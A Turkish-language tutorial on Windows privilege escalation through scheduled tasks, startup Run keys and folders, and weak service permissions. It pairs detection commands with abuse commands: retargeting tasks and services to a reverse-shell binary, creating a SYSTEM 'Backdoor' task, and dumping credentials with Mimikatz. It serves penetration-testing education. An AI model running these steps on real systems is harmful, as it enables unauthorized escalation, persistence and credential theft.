**Windows Privilege Escalation: Abusing Scheduled Tasks and Startup Applications (Zamanlanmış Görevler ve Başlangıç Uygulamalarının Kötüye Kullanılması)**

Windows’ta zamanlanmış görevler ve başlangıç uygulamaları, genellikle sistem bakımını veya uygulama güncellemelerini otomatikleştirmek için kullanılır. Yanlış yapılandırıldıklarında veya zafiyet barındırdıklarında, saldırganlar tarafından privilege escalation amacıyla kullanılabilir.

---

### **4.1. Zamanlanmış Görevlerin Kötüye Kullanılması (Abusing Scheduled Tasks)**

Zamanlanmış görevler, belirli bir zamanda veya olay tetiklendiğinde çalışan komutlar veya programlardır. Bu görevlerin izinleri zayıfsa veya saldırgan tarafından değiştirilebiliyorsa, kötüye kullanılabilir.

#### **Tespit**
1. Zamanlanmış görevleri listelemek için:
   ```cmd
   schtasks /query /fo LIST /v
   ```
   veya PowerShell ile:
   ```powershell
   Get-ScheduledTask | fl
   ```
2. Özellikle SYSTEM yetkisiyle çalışan görevlerin `Action` kısmını kontrol edin.

#### **Kötüye Kullanma**
1. Yazılabilir bir görev bulun:
   ```cmd
   accesschk.exe -uwcqv "Authenticated Users" C:\Windows\Tasks
   ```
2. Görevi zararlı bir payload ile değiştirin:
   ```cmd
   schtasks /change /tn "TaskName" /tr "C:\reverse_shell.bat"
   ```
3. Görevi tetikleyin:
   ```cmd
   schtasks /run /tn "TaskName"
   ```

---

### **4.2. Yazılabilir Zamanlanmış Görev Dosyaları (Writable Scheduled Task Files)**

Zamanlanmış görev dosyaları genellikle `C:\Windows\System32\Tasks` dizininde saklanır. Bu dosyaların yazılabilir olması, saldırganların görev tanımlarını değiştirmesine olanak tanır.

#### **Tespit**
1. Yazılabilir görev dosyalarını bulmak için:
   ```cmd
   icacls C:\Windows\System32\Tasks
   ```

#### **Kötüye Kullanma**
1. Görev dosyasını düzenleyerek zararlı bir komut ekleyin.
2. Görevi yeniden başlatarak payload'ı çalıştırın.

---

### **4.3. Başlangıç Uygulamalarının Kötüye Kullanılması (Abusing Startup Applications)**

Windows, sistem başlangıcında çalıştırılacak uygulamaları belirlemek için çeşitli yollar kullanır. Bu başlangıç mekanizmaları, saldırganlar için bir giriş noktası olabilir.

#### **Tespit**
1. Başlangıç uygulamalarını kontrol etmek için:
   - **Kayıt Defteri Anahtarları**:
     ```cmd
     reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
     reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
     ```
   - **Başlangıç Klasörleri**:
     ```cmd
     dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
     dir "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
     ```

#### **Kötüye Kullanma**
1. Yazılabilir bir kayıt defteri anahtarı veya dosya bulun.
2. Payload ekleyin:
   ```cmd
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyPayload /t REG_SZ /d "C:\reverse_shell.exe"
   ```

---

### **4.4. Zayıf İzinlere Sahip Hizmetler (Weak Permissions in Services)**

Başlangıçta çalışan bazı hizmetlerin yürütme izinleri zayıf olabilir.

#### **Tespit**
1. Hizmet izinlerini kontrol edin:
   ```cmd
   accesschk.exe -uwcqv "Authenticated Users" * /svc
   ```

#### **Kötüye Kullanma**
1. Yazılabilir bir hizmet bulun.
2. Hizmet yolunu değiştirin:
   ```cmd
   sc config ServiceName binPath= "C:\reverse_shell.exe"
   ```
3. Hizmeti yeniden başlatın:
   ```cmd
   net stop ServiceName && net start ServiceName
   ```

---

### **4.5. Görev Yöneticisi (Task Scheduler) ile Yeni Görev Oluşturma**

Zamanlanmış bir görev oluşturarak, sistem başlangıcında veya belirli bir olayda payload çalıştırabilirsiniz.

#### **Kötüye Kullanma**
1. Yeni bir görev oluşturun:
   ```cmd
   schtasks /create /tn "Backdoor" /tr "C:\reverse_shell.exe" /sc onlogon /ru SYSTEM
   ```
2. Görevi tetikleyin:
   ```cmd
   schtasks /run /tn "Backdoor"
   ```

---

### **4.6. Yüksek Yetkili Zamanlanmış Görevlerin Çalınması**

Bazı zamanlanmış görevler, yüksek yetkili kullanıcıların (ör. SYSTEM veya Admin) kimlik bilgilerini içerir.

#### **Kötüye Kullanma**
1. Görev çalıştırıldığında `Mimikatz` ile kimlik bilgilerini alın:
   ```cmd
   mimikatz.exe
   sekurlsa::logonpasswords
   ```

---

### **Araçlar**
- **AccessChk:** Dosya ve görev izinlerini kontrol etmek için.
- **Autoruns:** Başlangıç uygulamalarını detaylı şekilde listelemek için.
- **Mimikatz:** Zamanlanmış görevlerde kullanılan kimlik bilgilerini çalmak için.

---
